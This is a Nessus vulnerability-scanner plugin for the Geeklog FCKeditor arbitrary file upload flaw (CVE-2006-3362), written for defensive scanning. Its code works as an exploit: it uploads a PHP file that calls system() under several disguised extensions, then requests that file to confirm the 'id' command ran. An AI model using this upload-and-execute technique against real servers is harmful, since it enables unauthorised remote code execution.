#
# (C) Tenable Network Security
#


  desc = "
Synopsis :

The remote web server contains a PHP application that is affected by
an arbitrary file upload vulnerability. 

Description :

The remote host is running Geeklog, an open-source weblog powered by
PHP and MySQL. 

The version of Geeklog installed on the remote host includes an older
version of FCKeditor that is enabled by default and allows an
unauthenticated attacker to upload arbitrary files containing, say,
PHP code, and then to execute them subject to the privileges of the
web server user id. 

See also :

http://www.milw0rm.com/exploits/1964
http://www.geeklog.net/article.php/exploit-for-fckeditor-filemanager
http://www.geeklog.net/article.php/geeklog-1.4.0sr4

Solution :

Upgrade to Geeklog 1.4.0sr4 or later or disable FCKeditor as discussed
in the first vendor advisory above. 

Risk factor :

Medium / CVSS Base Score : 5.5
(AV:R/AC:H/Au:NR/C:P/I:P/A:P/B:N)";


if (description)
{
  script_id(21780);
  script_version("$Revision: 1.5 $");

  script_cve_id("CVE-2006-3362");
  script_bugtraq_id(18767);

  script_name(english:"Geeklog FCKeditor Arbitrary File Upload Vulnerability");
  script_summary(english:"Tries to upload a file with PHP code using Geeklog's FCKeditor");
 
  script_description(english:desc);
 
  script_category(ACT_DESTRUCTIVE_ATTACK);
  script_family(english:"CGI abuses");
 
  script_copyright(english:"This script is Copyright (C) 2006 Tenable Network Security");

  script_dependencies("http_version.nasl");
  script_exclude_keys("Settings/disable_cgi_scanning");
  script_require_ports("Services/www", 80);

  exit(0);
}


include("global_settings.inc");
include("http_func.inc");
include("http_keepalive.inc");


port = get_http_port(default:80);
if (!get_port_state(port)) exit(0);
if (!can_host_php(port:port)) exit(0);


# Loop through various directories.
if (thorough_tests) dirs = make_list("/geeklog", cgi_dirs());
else dirs = make_list(cgi_dirs());

foreach dir (dirs)
{
  # Make sure the affected script exists.
  url = string(dir, "/fckeditor/editor/filemanager/browser/mcpuk/connectors/php/connector.php");
  req = http_get(item:url, port:port);
  res = http_keepalive_send_recv(port:port, data:req, bodyonly:TRUE);
  if (res == NULL) exit(0);

  # If it does...
  if ("Invalid command." >< res)
  {
    # Try to upload a file that will execute a command.
    cmd = "id";
    fname = string(SCRIPT_NAME, "-", unixtime(), ".php");

    exts = make_list(
      "zip",
      "doc",
      "xls",
      "pdf",
      "rtf",
      "csv",
      "jpg",
      "gif",
      "jpeg",
      "png",
      "avi",
      "mpg",
      "mpeg",
      "swf",
      "fla"
    );
    foreach ext (exts)
    {
      boundary = "nessus";
      req = string(
        "POST ",  url, "?Command=FileUpload&Type=File HTTP/1.1\r\n",
        "Host: ", get_host_name(), "\r\n",
        "User-Agent: ", get_kb_item("global_settings/http_user_agent"), "\r\n",
        "Content-Type: multipart/form-data; boundary=", boundary, "\r\n"
        # nb: we'll add the Content-Length header and post data later.
      );
      boundary = string("--", boundary);
      postdata = string(
        boundary, "\r\n", 
        'Content-Disposition: form-data; name="NewFile"; filename="', fname, ".", ext, '"', "\r\n",
        "Content-Type:\r\n",
        "\r\n",
        '# nb: only run cmd if the request is from the nessusd host.\r\n',
        '<? if ($REMOTE_ADDR == "', this_host(), '") { system(', cmd, "); } ?>\r\n",

        boundary, "--", "\r\n"
      );
      req = string(
        req,
        "Content-Length: ", strlen(postdata), "\r\n",
        "\r\n",
        postdata
      );
      res = http_keepalive_send_recv(port:port, data:req, bodyonly:TRUE);
      if (res == NULL) exit(0);

      # If it looks like the upload was accepted...
      if ("OnUploadCompleted(0)" >< res)
      {
        # Try to execute the script.
        req = http_get(
          item:string(dir, "/images/library/File/", fname, ".", ext), 
          port:port
        );
        res = http_keepalive_send_recv(port:port, data:req, bodyonly:TRUE);
        if (res == NULL) exit(0);
    
        # There's a problem if...
        if (
          # the output looks like it's from id or...
          egrep(pattern:"uid=[0-9]+.*gid=[0-9]+.*", string:res) ||
          # PHP's disable_functions prevents running system().
          egrep(pattern:"Warning.+\(\) has been disabled for security reasons", string:res)
        )
        {
          res = strstr(res, "uid=");
          if (egrep(pattern:"uid=[0-9]+.*gid=[0-9]+.*", string:res))
            report = string(
              desc,
              "\n\n",
              "Plugin output :\n",
              "\n",
              "Nessus was able to execute the command '", cmd, "' on the remote host,\n",
              "which produced the following output :\n",
              "\n",
              res
            );
          else report = desc;

          security_warning(port:port, data:report);
          exit(0);
        }
      }
    }
  }
}
